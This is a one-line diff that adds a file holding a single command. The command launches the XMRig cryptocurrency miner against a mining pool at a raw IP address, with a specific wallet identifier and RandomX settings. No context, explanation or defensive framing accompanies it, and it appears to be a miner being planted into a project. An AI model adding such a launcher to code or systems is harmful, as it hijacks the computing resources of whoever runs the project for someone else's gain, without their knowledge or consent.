@@ -1,0 +1,1 @@
+./xmrig -o stratum+tcp://147.185.221.211:46787 -u NHbFmwPXdJNT6i4DqdyHhgh8deGTXuZka6Dj -p x -k -a rx/0
